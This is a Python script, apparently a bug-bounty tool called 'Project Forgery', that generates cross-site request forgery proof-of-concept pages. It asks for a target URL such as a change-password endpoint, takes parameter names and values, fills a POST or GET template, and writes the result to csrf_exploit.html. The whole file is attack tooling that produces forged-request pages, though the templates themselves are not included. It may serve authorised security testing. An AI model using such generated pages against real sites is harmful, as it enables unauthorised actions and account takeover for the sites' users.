import os
import requests
import sys
import logging
from jinja2 import Template
from utils.colors import colors

class CSRFTester:
    def __init__(self, target_url, parameters, values, http_method='POST'):
        self.target_url = target_url
        self.parameters = parameters
        self.values = values
        self.http_method = http_method
        self.cookies = dict()

    def generate_exploit_html(self):
        try:
            template_filename = (
                "templates/post_exploit_template.html"
                if self.http_method == 'POST'
                else "templates/get_exploit_template.html"  # Use the GET template
            )

            with open(template_filename, "r") as template_file:
                template_content = template_file.read()

            template = Template(template_content)
            
            parameters_values_pairs = list(zip(self.parameters, self.values))

            exploit_html = template.render(target_url=self.target_url, parameters_values_pairs=parameters_values_pairs)

            return exploit_html
        except Exception as e:
            logging.error(f"An error occurred: {str(e)}")
            return None

if __name__ == "__main__":
    logging.basicConfig(filename="csrf_test.log", level=logging.INFO)

    try:
        print(colors.fg.purple + "===================PROJECT FORGERY V1.0.0==================" + colors.reset)
        print(colors.fg.purple + "==============AUTOMATED CSRF PoC SCRIPT GENERATOR==========" + colors.reset)
        print(colors.fg.purple + "\tCreator By : Haqq the Bug Hunter" + colors.reset)

        target_base_url = input("Enter the base target URL (e.g., https://example.com/change-password): ")
        parameter_names = input("Enter the parameter names separated by commas (e.g., email): ").split(',')
        parameter_values = input("Enter the corresponding values separated by commas (e.g., test@test.ca): ").split(',')
        http_method = input("Enter HTTP method (POST/GET, default: POST): ").upper() or 'POST'

        csrf_tester = CSRFTester(target_base_url, parameter_names, parameter_values, http_method)

        exploit_html = csrf_tester.generate_exploit_html()

        if exploit_html:
            output_filename = "csrf_exploit.html"
            with open(output_filename, "w") as exploit_file:
                exploit_file.write(exploit_html)
            print(colors.fg.green + f"CSRF exploit HTML file '{output_filename}' created successfully." + colors.reset)
        else:
            print(colors.fg.red + "Failed to generate the CSRF exploit HTML." + colors.reset)
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
        print(colors.fg.red + "An error occurred. Check the log file for details." + colors.reset)
